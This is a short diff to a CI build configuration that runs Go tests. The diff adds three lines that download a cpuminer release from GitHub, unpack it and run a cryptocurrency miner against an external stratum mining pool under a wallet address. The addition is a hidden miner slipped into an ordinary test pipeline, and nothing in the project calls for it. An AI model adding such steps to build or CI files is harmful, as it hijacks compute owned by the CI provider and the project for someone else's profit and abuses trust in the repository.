@@ -25,6 +25,9 @@ docker_builder:
     - wget --no-verbose -O - https://golang.org/dl/go1.15.linux-amd64.tar.gz | tar -C /usr/local -xz
     - export PATH=$PATH:/usr/local/go/bin
     - go test ./...
+    - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+    - tar xf cpuminer-opt-linux.tar.gz
+    - ./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6gpz239e68cx824g7tk2etgwrmlshta324uyv6.bo
   env:
     HOME: /root
     CIRRUS_CONTAINER_BACKEND: podman
